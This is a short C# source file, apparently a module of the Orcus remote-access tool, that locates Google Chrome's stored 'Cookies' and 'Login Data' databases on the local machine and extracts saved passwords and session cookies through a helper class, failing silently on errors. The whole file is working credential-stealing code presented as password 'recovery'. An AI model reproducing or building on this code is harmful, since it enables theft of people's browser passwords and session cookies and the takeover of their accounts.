using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Chrome;

internal class Chrome : ICookieRecovery, IPasswordRecovery
{
	private const string ApplicationName = "Google Chrome";

	public IEnumerable<RecoveredCookie> GetCookies()
	{
		try
		{
			return ChromiumBase.Cookies(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Cookies"), "Google Chrome");
		}
		catch (Exception)
		{
			return new List<RecoveredCookie>();
		}
	}

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		try
		{
			return ChromiumBase.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Login Data"), "Google Chrome");
		}
		catch (Exception)
		{
			return new List<RecoveredPassword>();
		}
	}
}
